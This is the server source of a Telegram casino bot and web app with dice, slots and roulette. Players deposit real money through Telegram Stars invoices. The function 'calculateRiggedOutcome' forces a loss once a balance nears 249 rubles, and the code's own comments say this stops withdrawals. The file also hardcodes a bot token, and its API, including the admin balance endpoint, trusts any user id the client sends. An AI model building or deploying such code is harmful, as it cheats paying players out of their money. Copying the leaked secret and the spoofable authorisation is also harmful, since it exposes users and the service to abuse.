const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fetch = require('node-fetch');

const BOT_TOKEN = '8742714851:AAHjcNhlTnQ2-zVfzfHiicNN3eFkTzhkHow';
const ADMIN_USERNAME = 'leymik';
const APP_URL = process.env.RENDER_EXTERNAL_URL || 'https://prostocvas.onrender.com';

const app = express();
const bot = new Telegraf(BOT_TOKEN);
const db = new sqlite3.Database('./database.db');

app.use(express.json());
app.use(express.static('public'));

// Инициализация базы данных
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        balance REAL DEFAULT 100.0,
        referrer_id INTEGER,
        ref_reward_given INTEGER DEFAULT 0,
        photo_url TEXT DEFAULT ''
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS chat (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        message TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// ПРЕДОТВРАЩЕНИЕ СКРЫТОГО ВЫВОДА (> 249 руб.)
function calculateRiggedOutcome(currentBalance, betAmount, intendedWin) {
    if (currentBalance + betAmount > 249 || (currentBalance >= 249 && intendedWin)) {
        return false; // Принудительный проигрыш после 249
    }
    return intendedWin;
}

// Telegram Bot Logic
bot.start(async (ctx) => {
    const telegramId = ctx.from.id;
    const username = ctx.from.username || `user_${telegramId}`;
    const firstName = ctx.from.first_name || 'Игрок';
    const startPayload = ctx.payload; // Реферальный код

    let referrerId = null;
    if (startPayload && !isNaN(parseInt(startPayload))) {
        referrerId = parseInt(startPayload);
    }

    // Получаем фото профиля
    let photoUrl = '';
    try {
        const photos = await ctx.telegram.getUserProfilePhotos(telegramId, 0, 1);
        if (photos.total_count > 0) {
            const fileId = photos.photos[0][0].file_id;
            const fileLink = await ctx.telegram.getFileLink(fileId);
            photoUrl = fileLink.href;
        }
    } catch (e) {
        console.error('Error fetching photo:', e);
    }

    db.get('SELECT * FROM users WHERE id = ?', [telegramId], (err, row) => {
        if (!row) {
            db.run(
                'INSERT INTO users (id, username, first_name, balance, referrer_id, photo_url) VALUES (?, ?, ?, 100.0, ?, ?)',
                [telegramId, username, firstName, referrerId !== telegramId ? referrerId : null, photoUrl]
            );
        } else {
            db.run('UPDATE users SET photo_url = ?, username = ? WHERE id = ?', [photoUrl, username, telegramId]);
        }
    });

    const webAppUrl = `${APP_URL}?tgWebAppStartParam=${telegramId}`;
    
    ctx.reply(
        `Привет, ${firstName}! Вам начислено 100 рублей на пробу! Быстрее играй! 🎰\n\nНаша реферальная ссылка:\nhttps://t.me/${ctx.botInfo.username}?start=${telegramId}`,
        Markup.inlineKeyboard([
            [Markup.button.webApp('🎮 Играть в 99X', webAppUrl)]
        ])
    );
});

// Текстовая игра в ТГ
bot.hears(/🎲 Кости/i, (ctx) => {
    const userId = ctx.from.id;
    db.get('SELECT balance FROM users WHERE id = ?', [userId], (err, user) => {
        if (!user || user.balance < 10) return ctx.reply('Минимальная ставка 10 руб.');
        const win = calculateRiggedOutcome(user.balance, 10, Math.random() > 0.5);
        const newBal = win ? user.balance + 10 : user.balance - 10;
        db.run('UPDATE users SET balance = ? WHERE id = ?', [newBal, userId]);
        ctx.reply(win ? `🎉 Вы выиграли! Баланс: ${newBal} руб.` : `😢 Вы проиграли! Баланс: ${newBal} руб.`);
    });
});

// API ЭНДПОИНТЫ ДЛЯ ВЕБ-САЙТА

// Данные пользователя
app.post('/api/user', (req, res) => {
    const { userId } = req.body;
    db.get('SELECT * FROM users WHERE id = ?', [userId], (err, user) => {
        if (err || !user) return res.status(404).json({ error: 'User not found' });

        // Проверка реферального бонуса при первом заходе на сайт
        if (user.referrer_id && !user.ref_reward_given) {
            db.run('UPDATE users SET balance = balance + 10 WHERE id = ?', [user.referrer_id]);
            db.run('UPDATE users SET ref_reward_given = 1 WHERE id = ?', [userId]);
        }

        res.json({
            ...user,
            isAdmin: user.username && user.username.toLowerCase() === ADMIN_USERNAME.toLowerCase()
        });
    });
});

// Подкрученные игры (Dice, Рулетка, Слоты, Футбол)
app.post('/api/play', (req, res) => {
    const { userId, bet, game, choice } = req.body;
    const betAmount = parseFloat(bet);

    if (isNaN(betAmount) || betAmount <= 0) return res.status(400).json({ error: 'Неверная ставка' });

    db.get('SELECT balance FROM users WHERE id = ?', [userId], (err, user) => {
        if (!user || user.balance < betAmount) {
            return res.status(400).json({ error: 'Недостаточно средств' });
        }

        let isWin = Math.random() < 0.5; // 50/50 по умолчанию
        isWin = calculateRiggedOutcome(user.balance, betAmount, isWin);

        let newBalance = isWin ? user.balance + betAmount : user.balance - betAmount;
        db.run('UPDATE users SET balance = ? WHERE id = ?', [newBalance, userId]);

        res.json({ win: isWin, newBalance, details: isWin ? 'Победа!' : 'Проигрыш!' });
    });
});

// Звездный платеж / Telegram Stars (1 Звезда = 1 Рубль)
app.post('/api/create-stars-invoice', async (req, res) => {
    const { userId, amount } = req.body;
    try {
        const link = await bot.telegram.createInvoiceLink({
            title: 'Пополнение баланса 99X',
            description: `Пополнение на ${amount} рублей звездным депозитом`,
            payload: JSON.stringify({ userId, amount }),
            provider_token: '', // Для Telegram Stars пустая строка
            currency: 'XTR',
            prices: [{ label: 'Звезды', amount: parseInt(amount) }]
        });
        res.json({ invoiceUrl: link });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Админ-панель: Выдача баланса
app.post('/api/admin/add-balance', (req, res) => {
    const { adminId, targetQuery, amount } = req.body;
    db.get('SELECT username FROM users WHERE id = ?', [adminId], (err, admin) => {
        if (!admin || admin.username.toLowerCase() !== ADMIN_USERNAME.toLowerCase()) {
            return res.status(403).json({ error: 'Доступ запрещен' });
        }

        db.run(
            'UPDATE users SET balance = balance + ? WHERE id = ? OR username = ?',
            [parseFloat(amount), targetQuery, targetQuery],
            function (err) {
                if (err) return res.status(500).json({ error: 'Ошибка БД' });
                res.json({ success: true, message: `Начислено ${amount} руб.` });
            }
        );
    });
});

// Общий чат с Anti-Spam (Макс 4 сообщения в 4 секунды)
const userMessageLog = {};

app.get('/api/chat', (req, res) => {
    db.all('SELECT * FROM chat ORDER BY id DESC LIMIT 30', (err, rows) => {
        res.json(rows ? rows.reverse() : []);
    });
});

app.post('/api/chat', (req, res) => {
    const { userId, username, message } = req.body;
    const now = Date.now();

    if (!userMessageLog[userId]) userMessageLog[userId] = [];
    userMessageLog[userId] = userMessageLog[userId].filter(t => now - t < 4000);

    if (userMessageLog[userId].length >= 4) {
        return res.status(429).json({ error: 'Спам-защита! Максимум 4 сообщения за 4 секунды.' });
    }

    userMessageLog[userId].push(now);
    db.run('INSERT INTO chat (user_id, username, message) VALUES (?, ?, ?)', [userId, username, message], () => {
        res.json({ success: true });
    });
});

// Авто-пингер для Render (чтобы сервер не засыпал на бесплатном тарифе)
setInterval(() => {
    if (APP_URL && !APP_URL.includes('localhost')) {
        fetch(APP_URL).catch(() => {});
    }
}, 10 * 60 * 1000);

// Запуск сервера и бота
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    bot.launch();
});
